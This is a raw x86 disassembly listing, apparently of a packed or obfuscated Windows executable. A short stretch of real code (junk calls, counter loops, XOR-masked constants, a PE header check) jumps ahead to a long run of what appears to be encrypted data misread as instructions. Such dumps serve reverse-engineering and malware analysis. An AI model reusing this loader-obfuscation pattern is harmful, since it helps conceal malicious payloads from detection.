  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	adc    ah,BYTE PTR [esi+edx*2+0x41]
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	mov    DWORD PTR [ebx+0x6c],edi
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x471744f2]
  402b65:	enter  0x99e2,0xbe
  402b69:	(bad)  
  402b6a:	outs   dx,DWORD PTR ds:[esi]
  402b6b:	fild   QWORD PTR [esi+0x3a]
  402b6e:	mov    ds:0x22263eab,al
  402b74:	mov    eax,ds:0x64abfcad
  402b79:	ror    BYTE PTR [ecx],cl
  402b7b:	mov    ah,0xea
  402b7d:	cmp    ebx,DWORD PTR [edi]
  402b7f:	les    ebx,FWORD PTR [eax]
  402b81:	jmp    0x36466049
  402b86:	sbb    bh,cl
  402b88:	sbb    BYTE PTR [esi+0x32],al
  402b8b:	dec    ecx
  402b8c:	add    esp,esp
  402b8e:	sbb    BYTE PTR [ebx-0x4ce1d14f],dh
  402b94:	mov    al,BYTE PTR [ebx+0x58]
  402b97:	add    dl,al
  402b99:	shl    DWORD PTR [ecx+0x17],1
  402b9c:	adc    al,0x95
  402b9e:	dec    esp
  402b9f:	ja     0x402c0f
  402ba1:	retf   
  402ba2:	adc    eax,0xe0b08ac7
  402ba7:	ror    BYTE PTR [edx-0x2],0x83
  402bab:	dec    edx
  402bac:	aas    
  402bad:	mov    esi,0x15821917
  402bb2:	adc    DWORD PTR [edi+edx*4-0x5218a23c],ecx
  402bb9:	test   ebx,edx
  402bbb:	cs test eax,0x317e1bdb
  402bc1:	xor    eax,0xc124ea56
  402bc6:	and    al,0xd9
  402bc8:	push   ecx
  402bc9:	jb     0x402c08
  402bcb:	cmp    ch,dl
  402bcd:	and    BYTE PTR [edi+edi*2-0x4dca1ecd],dh
  402bd4:	fisubr WORD PTR [ebx-0x402f7602]
  402bda:	sub    eax,0x8c3387e9
  402bdf:	es jno 0x402bca
  402be2:	test   al,0xde
  402be4:	cli    
  402be5:	or     bh,0x89
  402be8:	jp     0x402c52
  402bea:	in     al,0xc
  402bec:	(bad)  
  402bed:	mov    dl,0x85
  402bef:	cmp    eax,0x9a1a6cd0
  402bf4:	inc    DWORD PTR [ecx]
  402bf6:	mov    ebx,0xd6082093
  402bfb:	ret    
  402bfc:	mov    ebx,0xc35222c0
  402c01:	sub    DWORD PTR [ecx-0x2ae32b09],ebp
  402c07:	lea    ebx,[eax+esi*8-0x58]
  402c0b:	jmp    0x402c5e
  402c0d:	pusha  
  402c0e:	push   edi
  402c0f:	xchg   edi,eax
  402c10:	and    dh,BYTE PTR [edx-0x4]
  402c13:	xor    BYTE PTR [edx-0x5422aee6],0x27
  402c1a:	(bad)  
  402c1b:	mov    dl,BYTE PTR [esi-0x297ed32]
  402c21:	popa   
  402c22:	sub    ah,BYTE PTR [edx]
  402c24:	or     DWORD PTR [edi+0x7c],edi
  402c27:	imul   ebx,ebx,0x17
  402c2a:	popf   
  402c2b:	jl     0x402be4
  402c2d:	sar    BYTE PTR [eax-0x6c],cl
  402c30:	int3   
  402c31:	daa    
  402c32:	leave  
  402c33:	out    0x48,eax
  402c35:	mov    edx,0xc0650797
  402c3a:	mov    dl,ah
  402c3c:	mov    dh,bl
  402c3e:	pusha  
  402c3f:	stc    
  402c40:	dec    edi
  402c41:	and    DWORD PTR [edi-0x16256365],edi
  402c47:	daa    
  402c48:	add    esi,DWORD PTR [edx]
  402c4a:	cmp    ah,BYTE PTR [edx+0x7307637f]
  402c50:	or     al,0x6
  402c52:	cld    
  402c53:	inc    ebp
  402c54:	dec    eax
  402c55:	aas    
  402c56:	cmp    bl,bl
  402c58:	sbb    edi,DWORD PTR [edi-0xe]
  402c5b:	(bad)  
  402c5c:	(bad)  
  402c5d:	fild   WORD PTR [edx]
  402c5f:	repnz sbb ecx,ebx
  402c62:	dec    edi
  402c63:	sbb    eax,0x162ceb5e
  402c69:	pop    esp
  402c6a:	and    edi,DWORD PTR [eax-0x35744c3d]
  402c70:	dec    esi
  402c71:	mov    ah,0xca
  402c73:	mov    ds:0x12c45216,eax
  402c78:	xchg   esp,eax
  402c79:	dec    esi
  402c7a:	ins    BYTE PTR es:[edi],dx
  402c7b:	cs out dx,al
  402c7d:	fwait
  402c7e:	sub    BYTE PTR [ecx-0x71],0x65
  402c82:	xchg   esi,eax
  402c83:	fisubr DWORD PTR [eax+0xe615f4e]
  402c89:	imul   ebp,DWORD PTR [ecx-0x544a765],0x9e6be7ef
  402c93:	and    BYTE PTR [ebx-0x1c],dh
  402c96:	cmp    DWORD PTR [esi+0x273be5da],0x1e
  402c9d:	mov    ds,edi
  402c9f:	aad    0xf4
  402ca1:	pop    ebx
  402ca2:	pop    ds
  402ca3:	xlat   BYTE PTR ds:[ebx]
  402ca4:	pop    ss
  402ca5:	dec    edi
  402ca6:	ds pop es
  402ca8:	xchg   edx,eax
  402ca9:	cs aad 0x0
  402cac:	aas    
  402cad:	ins    DWORD PTR es:[edi],dx
  402cae:	and    al,0x79
  402cb0:	push   ss
  402cb1:	push   ebx
  402cb2:	sahf   
  402cb3:	aas    
  402cb4:	jecxz  0x402cf3
  402cb6:	lods   eax,DWORD PTR ds:[esi]
  402cb7:	sbb    dl,BYTE PTR [edx]
  402cb9:	sub    DWORD PTR [bp+di],eax
  402cbc:	adc    al,0x1b
  402cbe:	jb     0x402d2f
  402cc0:	mov    esp,0x961201b6
  402cc5:	push   ecx
  402cc6:	mov    ds:0x5cae7730,eax
  402ccb:	scas   eax,DWORD PTR es:[edi]
  402ccc:	shl    DWORD PTR [esi],cl
  402cce:	scas   al,BYTE PTR es:[edi]
  402ccf:	xor    edx,eax
  402cd1:	pop    ss
  402cd2:	add    edi,DWORD PTR [ebx+0x20e4903b]
  402cd8:	sub    ch,dl
  402cda:	fmul   DWORD PTR [eax-0x35]
  402cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cde:	jae    0x402cfa
  402ce0:	pop    edx
  402ce1:	aam    0x18
  402ce3:	jge    0x402ccb
  402ce5:	pusha  
  402ce6:	inc    ebx
  402ce7:	mov    al,0x92
  402ce9:	outs   dx,DWORD PTR ds:[esi]
  402cea:	add    BYTE PTR [ebx-0x7650fdce],bl
  402cf0:	pop    edx
  402cf1:	cmp    edx,DWORD PTR [esi-0x78365f4b]
  402cf7:	pop    edi
  402cf8:	imul   eax,DWORD PTR [esp+edx*1+0x68],0xffffffa6
  402cfd:	rcl    edi,0x77
  402d00:	nop
  402d01:	push   edi
  402d02:	sub    DWORD PTR [ecx+0x65],0xffffffd6
  402d06:	scas   eax,DWORD PTR es:[edi]
  402d07:	xchg   esi,eax
  402d08:	icebp  
  402d09:	fadd   QWORD PTR [eax+edx*8-0x5c5641c5]
  402d10:	nop
  402d11:	sbb    DWORD PTR [esi-0x4631cf57],esi
  402d17:	and    DWORD PTR [edi+0x67c65ef4],ebp
  402d1d:	mov    ch,0xe
  402d1f:	cli    
  402d20:	fwait
  402d21:	mov    ds:0xe415eb59,al
  402d26:	pop    ds
  402d27:	and    DWORD PTR [edi-0x53],edx
  402d2a:	mov    eax,0x3f2304c9
  402d2f:	fidivr WORD PTR [esp+esi*8+0x5b]
  402d33:	(bad)  
  402d34:	(bad)  
  402d35:	mov    edx,0x9853e3e4
  402d3a:	(bad)  
  402d3b:	pop    ebx
  402d3c:	lods   eax,DWORD PTR ds:[esi]
  402d3d:	mov    bh,0x17
  402d3f:	mov    ebx,0x6f724b78
  402d44:	(bad)  
  402d46:	jge    0x402ce8
  402d48:	add    BYTE PTR [edx+0x11],bh
  402d4b:	add    al,0x97
  402d4d:	xor    eax,0xb1518fd9
  402d52:	pushf  
  402d53:	cmp    eax,0xb4b21ff1
  402d58:	pop    esi
  402d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d5a:	mov    cl,0x99
  402d5c:	(bad)  
  402d5d:	aad    0x53
  402d5f:	test   DWORD PTR ds:0x2012ac2,edx
  402d65:	push   ebp
  402d66:	xrelease xchg BYTE PTR [ebx],bl
  402d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d6a:	mov    esp,0x3a85a72d
  402d6f:	sub    al,0x74
  402d71:	sub    al,0x44
  402d73:	cdq    
  402d74:	leave  
  402d75:	fadd   QWORD PTR gs:[ecx-0x57]
  402d79:	mov    al,ds:0x8a8046c4
  402d7e:	push   eax
  402d7f:	fs jno 0x402d36
  402d82:	aam    0x80
  402d84:	ss sub al,0xdb
  402d87:	jp     0x402dd7
  402d89:	push   ebx
  402d8a:	hlt    
  402d8b:	enter  0x6c49,0xac
  402d8f:	mov    eax,ds:0x33e2d865
  402d94:	xchg   ebx,eax
  402d95:	sbb    ebx,ebx
  402d97:	or     cl,BYTE PTR [esi+ebp*1]
  402d9a:	add    BYTE PTR [edx],dl
  402d9c:	hlt    
  402d9d:	add    ch,BYTE PTR [edi]
  402d9f:	xchg   esi,eax
  402da0:	leave  
  402da1:	push   ebp
  402da2:	push   es
  402da3:	or     edi,esi
  402da5:	mov    edi,0x8aa245da
  402daa:	pop    esp
  402dab:	xchg   esp,eax
  402dac:	jecxz  0x402df5
  402dae:	rcr    BYTE PTR ds:0xf3d62781,1
  402db4:	inc    edx
  402db5:	lock jmp 0x402dc0
  402db8:	inc    ebp
  402db9:	lds    ebx,FWORD PTR [edx+0x13]
  402dbc:	(bad)  [esi-0x54]
  402dbf:	pop    ebp
  402dc0:	xchg   esi,eax
  402dc1:	call   0x7786288c
  402dc6:	fisttp WORD PTR [esp+eax*8+0x12]
  402dca:	(bad)  
  402dcc:	sub    ebp,ebx
  402dce:	fsub   DWORD PTR gs:[ecx+0x4a]
  402dd2:	cmp    DWORD PTR [esi-0x61fc794a],esi
  402dd8:	mov    al,0xe0
  402dda:	xor    BYTE PTR [edx+0x73],dh
  402ddd:	aad    0x74
  402ddf:	sub    cl,cl
  402de1:	test   BYTE PTR [ecx-0x60f46321],al
  402de7:	xor    ebp,ebx
  402de9:	mov    al,ds:0x96513862
  402dee:	push   edi
  402def:	adc    cl,bl
  402df1:	in     eax,dx
  402df2:	push   ebp
  402df3:	rol    edi,1
  402df5:	test   BYTE PTR [ebx],0x92
  402df8:	dec    esp
  402df9:	xchg   BYTE PTR [eax],dl
  402dfb:	pop    ebx
  402dfc:	add    al,0x5
  402dfe:	pop    es
  402dff:	and    ebp,DWORD PTR [ecx]
  402e01:	pusha  
  402e02:	imul   ebp,eax,0x79375fca
  402e08:	fbld   TBYTE PTR [esi]
  402e0a:	retf   0x2fde
  402e0d:	mov    ebx,esi
  402e0f:	inc    ebx
  402e10:	cmp    BYTE PTR [ebp-0x6636070f],cl
  402e16:	cwde   
  402e17:	mov    dh,0x8
  402e19:	ss out 0x60,eax
  402e1c:	pop    esi
  402e1d:	imul   esp,DWORD PTR [esi+0x2ca5c957],0xc9cc8476
  402e27:	lea    ebp,[ecx-0x4ad7d122]
  402e2d:	pop    edi
  402e2e:	jbe    0x402e1f
  402e30:	iret   
  402e31:	fucomip st,st(7)
  402e33:	out    0xfa,eax
  402e35:	mov    eax,0x972739f
  402e3a:	sti    
  402e3b:	xor    esp,ebp
  402e3d:	push   eax
  402e3e:	jno    0x402e90
  402e40:	pop    esp
  402e41:	cmp    eax,0x8f4e2631
  402e46:	xchg   edi,eax
  402e47:	inc    edi
  402e48:	les    esp,FWORD PTR [edi-0x28e4bea7]
  402e4e:	cdq    
  402e4f:	outs   dx,DWORD PTR ds:[esi]
  402e50:	mov    esp,DWORD PTR [eax-0x63d3e863]
  402e56:	mov    ss:0xca11a10,eax
  402e5c:	fldpi  
  402e5e:	ret    
  402e5f:	popa   
  402e60:	nop
  402e61:	jne    0x402eac
  402e63:	test   al,0x86
  402e65:	leave  
  402e66:	in     eax,0x36
  402e68:	call   0xfd07ec1b
  402e6d:	inc    ebp
  402e6e:	dec    eax
  402e6f:	aad    0x4c
  402e71:	mov    ah,0xf7
  402e73:	ins    BYTE PTR es:[edi],dx
  402e74:	pop    edx
  402e75:	push   eax
  402e76:	fwait
  402e77:	in     al,0xb3
  402e79:	(bad)
  402e7d:	inc    edx
  402e7e:	jnp    0x402e54
  402e80:	cmp    bl,BYTE PTR [eax]
  402e82:	(bad)  
  402e84:	mov    ebx,0x6ea8a402
  402e89:	retf   0x2d9f
  402e8c:	mov    dh,0xd3
  402e8e:	(bad)  
  402e8f:	sbb    al,0xfb
  402e91:	cmp    bl,BYTE PTR [ebx+ebx*1]
  402e94:	mov    bl,0xd9
  402e96:	fcmovnbe st,st(7)
  402e98:	mov    dh,0x63
  402e9a:	imul   ecx,DWORD PTR [ebp+0x70db69a5],0xad31e8b2
  402ea4:	retf   
  402ea5:	mov    edi,0x49a513fb
  402eaa:	outs   dx,BYTE PTR ds:[esi]
  402eab:	or     eax,0xbd641223
  402eb0:	add    eax,DWORD PTR ds:0x24414fdb
  402eb6:	or     eax,0x2033f7b2
  402ebb:	mov    ebp,0x61d3b265
  402ec0:	fiadd  WORD PTR [ebx]
  402ec2:	(bad)  
  402ec3:	sbb    al,0x73
  402ec5:	retf   0x2a91
  402ec8:	xor    dl,BYTE PTR [esi+0x2f5d74a0]
  402ece:	out    dx,eax
  402ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed0:	lods   al,BYTE PTR ds:[esi]
  402ed1:	xor    cl,cl
  402ed3:	clc    
  402ed4:	mov    esi,0x8dcf9b25
  402ed9:	movaps xmm1,xmm3
  402edc:	fs pop esi
  402edf:	sub    ah,BYTE PTR [eax]
  402ee1:	push   cs
  402ee2:	in     al,dx
  402ee3:	jmp    DWORD PTR [eax+ebp*1-0x505a0c85]
  402eea:	fldcw  WORD PTR [ebx+0xc]
  402eed:	pop    es
  402eee:	rcl    BYTE PTR [ebp+ecx*8-0x47811e50],0x76
  402ef6:	or     dh,BYTE PTR [eax]
  402ef8:	dec    edi
  402ef9:	sahf   
  402efa:	lods   eax,DWORD PTR ds:[esi]
  402efb:	shl    BYTE PTR cs:[eax],1
  402efe:	or     cl,ch
  402f00:	out    dx,eax
  402f01:	out    dx,al
  402f02:	mov    ebp,0x36005428
  402f07:	gs jne 0x402f41
  402f0a:	bound  ebp,QWORD PTR [ebx+0x2f]
  402f0d:	push   0xbfbb6a7b
  402f12:	in     al,0xb6
  402f14:	out    0x21,al
  402f16:	lock in al,0xb
  402f19:	mov    DWORD PTR ds:0xeac4d406,ecx
  402f1f:	rol    cl,0x82
  402f22:	mov    edi,0xfcf8e6c3
  402f27:	xor    BYTE PTR [ecx-0x43486417],al
  402f2d:	int3   
  402f2e:	daa    
  402f2f:	dec    ebx
  402f30:	enter  0x2ecc,0x23
  402f34:	and    BYTE PTR [esi-0x41fa786],ch
  402f3a:	xlat   BYTE PTR ds:[ebx]
  402f3b:	push   ebp
  402f3c:	add    dl,ch
  402f3e:	(bad)  
  402f3f:	mov    bx,cx
  402f42:	iret   
  402f43:	pop    edi
  402f44:	retf   0xe931
  402f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f48:	fwait
  402f49:	and    BYTE PTR [ebp-0x575c2e17],bl
  402f4f:	xor    al,0xa6
  402f51:	push   ss
  402f52:	pop    eax
  402f53:	ins    BYTE PTR es:[edi],dx
  402f54:	test   DWORD PTR [esi-0x4408038c],edi
  402f5a:	push   es
  402f5b:	cmp    edi,DWORD PTR [esi+ebp*8]
  402f5e:	test   DWORD PTR [ebp+0x51],edx
  402f61:	gs push 0x48
  402f64:	inc    edx
  402f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f66:	and    BYTE PTR [edx+0x2e047e5e],bh
  402f6c:	jg     0x402f9a
  402f6e:	mov    al,0xc1
  402f70:	into   
  402f71:	sub    esi,DWORD PTR [eax+ebp*8-0x64dc8ca2]
  402f78:	shl    BYTE PTR [edx+0x4c],0x6c
  402f7c:	xlat   BYTE PTR ds:[ebx]
  402f7d:	sbb    bl,BYTE PTR [edx+0x2bbfcb64]
  402f83:	pop    ebp
  402f84:	or     al,dh
  402f86:	sub    bl,ch
  402f88:	bound  eax,QWORD PTR [ebp+0x3b]
  402f8b:	xchg   edx,esi
  402f8d:	fwait
  402f8e:	mov    BYTE PTR [esi-0x710bf074],al
  402f94:	(bad)  
  402f95:	adc    edi,0xffffffcf
  402f98:	fsubrp st(6),st
  402f9a:	mov    al,ds:0xcb938ab8
  402f9f:	ins    BYTE PTR es:[edi],dx
  402fa0:	cs pushf 
  402fa2:	xchg   ebp,eax
  402fa3:	xchg   ecx,eax
  402fa4:	mov    esp,DWORD PTR ds:0x1422823c
  402faa:	rcl    BYTE PTR [esi-0xddffc12],1
  402fb0:	dec    ecx
  402fb1:	mov    cl,0x81
  402fb3:	dec    DWORD PTR [esi+0xb]
  402fb6:	jne    0x402ffc
  402fb8:	jne    0x402fa2
  402fba:	iret   
  402fbb:	call   0xd9515226
  402fc0:	jmp    0xb48cb10e
  402fc5:	pop    es
  402fc6:	test   BYTE PTR [eax],ch
  402fc8:	(bad)  
  402fc9:	jmp    0x6f0066c8
  402fce:	aaa    
  402fcf:	ret    
  402fd0:	(bad)  
  402fd1:	pop    edi
  402fd2:	call   0x1f4f:0x2a31ed26
  402fd9:	repnz add eax,0xcb12fd8
  402fdf:	rol    DWORD PTR [eax],0x72
  402fe2:	push   edx
  402fe3:	ss mov ebp,0x9bd904e6
  402fe9:	mov    dl,0x4e
  402feb:	sub    eax,0x7e432e5e
  402ff0:	retf   0x99c5
  402ff3:	push   ecx
  402ff4:	mov    esp,0x77123bbd
  402ff9:	aad    0xa3
  402ffb:	add    dl,cl
  402ffd:	mul    BYTE PTR [edx+0x71]
  403000:	out    dx,al
  403001:	jmp    0x34772f86
  403006:	mov    bl,0xf2
  403008:	clc    
  403009:	lods   eax,DWORD PTR ds:[esi]
  40300a:	mov    ecx,cs
  40300c:	nop
  40300d:	mul    DWORD PTR ds:0x8b2f7e1f
  403013:	je     0x402fd7
  403015:	add    al,0xcf
  403017:	mov    edi,0xc8fb551d
  40301c:	and    esi,DWORD PTR [eax-0x5]
  40301f:	mov    ah,0x49
  403021:	cmp    cl,BYTE PTR [eax-0x18]
  403024:	and    ah,BYTE PTR [esi+0x2b995607]
  40302a:	pushf  
  40302b:	pop    esi
  40302c:	xor    DWORD PTR ds:0x39036d7f,ebx
  403032:	aam    0x85
  403034:	(bad)  
  403036:	jno    0x403038
  403038:	test   dh,0x7d
  40303b:	hlt    
  40303c:	aas    
  40303d:	pop    edx
  40303e:	sbb    bl,BYTE PTR ss:[ecx-0x5972c5cc]
  403045:	jmp    0x403002
  403047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403048:	mov    ch,0xe5
  40304a:	mov    edx,0x4bfc32d8
  40304f:	jo     0x40308a
  403051:	out    dx,eax
  403052:	push   es
  403053:	std    
  403054:	cwde   
  403055:	repz xchg edi,eax
  403057:	rcl    DWORD PTR [edi+0x3d],cl
  40305a:	(bad)  
  40305b:	xor    DWORD PTR [ebx-0x5e],esi
  40305e:	(bad)
  403061:	in     al,dx
  403062:	lods   al,BYTE PTR ds:[esi]
  403063:	mov    ds:0xe6c1cdcd,al
  403068:	lods   al,BYTE PTR ds:[esi]
  403069:	imul   edi
  40306b:	test   al,0xfe
  40306d:	enter  0x10a7,0x8f
  403071:	xchg   edi,eax
  403072:	mov    ebx,0x984954cc
  403077:	imul   ebx,DWORD PTR ds:[edi],0xba3b3032
  40307e:	cmp    ebp,esp
  403080:	cld    
  403081:	xchg   ebp,eax
  403082:	outs   dx,DWORD PTR ds:[esi]
  403083:	xchg   WORD PTR [ecx+0x61],dx
  403087:	adc    BYTE PTR [ebx-0x4eee3d10],cl
  40308d:	xchg   esp,eax
  40308e:	xchg   edi,eax
  40308f:	aas    
  403090:	adc    al,0xca
  403092:	lahf   
  403093:	mov    ds:0x9a1d355e,eax
  403098:	adc    bh,BYTE PTR [eax+0x3d]
  40309b:	cmp    ebx,DWORD PTR [ecx+eax*1]
  40309e:	mov    eax,0x41ab8b6f
  4030a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a4:	mov    ecx,0x64a2f6a3
  4030a9:	cmp    al,0x1
  4030ab:	inc    edi
  4030ac:	jl     0x403113
  4030ae:	mov    al,ds:0xd2cf1b26
  4030b3:	popf   
  4030b4:	push   ss
  4030b5:	jb     0x40308b
  4030b7:	push   esp
  4030b8:	loopne 0x403072
  4030ba:	sbb    BYTE PTR [edx+0x34],ch
  4030bd:	fs dec edx
  4030bf:	inc    esi
  4030c0:	sbb    eax,DWORD PTR [ebp-0x21]
  4030c3:	sub    eax,0x94ece094
  4030c8:	and    BYTE PTR [ebx],ah
  4030ca:	ds push es
  4030cc:	int3   
  4030cd:	test   BYTE PTR [edx-0x3c],cl
  4030d0:	jmp    0xf111:0xeaffd523
  4030d7:	les    ecx,FWORD PTR [edi+edx*8-0x7cc36cde]
  4030de:	mov    BYTE PTR [eax+0x12],dh
  4030e1:	push   edi
  4030e2:	shl    ebx,0x40
  4030e5:	push   edx
  4030e6:	in     al,0x1a
  4030e8:	pop    edx
  4030e9:	add    ebx,eax
  4030eb:	repz dec eax
  4030ed:	nop
  4030ee:	imul   esi,DWORD PTR [esp+ebp*2],0xffffff9e
  4030f2:	jl     0x40309c
  4030f4:	test   BYTE PTR [ecx-0x2c],0x43
  4030f8:	test   DWORD PTR ds:0x39de5692,0xf2f9453d
  403102:	sbb    al,0xd4
  403104:	ror    DWORD PTR [eax-0x2c],1
  403107:	pop    ss
  403108:	mov    bh,BYTE PTR [eax+ebx*4+0x6667f7c9]
  40310f:	adc    DWORD PTR [ebx-0xe],esi
  403112:	in     eax,dx
  403113:	xchg   edx,eax
  403114:	cmc    
  403115:	nop
  403116:	daa    
  403117:	int3   
  403118:	push   eax
  403119:	dec    ebx
  40311a:	cli    
  40311b:	or     BYTE PTR [eax-0x80],al
  40311e:	popa   
  40311f:	loop   0x4030ce
  403121:	mov    ah,BYTE PTR [edx+0x66]
  403124:	mov    esi,eax
  403126:	paddusb mm4,QWORD PTR [esp+edx*4]
  40312a:	mov    esi,0x8da0e56a
  403130:	or     esi,DWORD PTR [esi+0x37d9424a]
  403136:	add    ebp,DWORD PTR [ebp+0x1f9e9ae0]
  40313c:	inc    edi
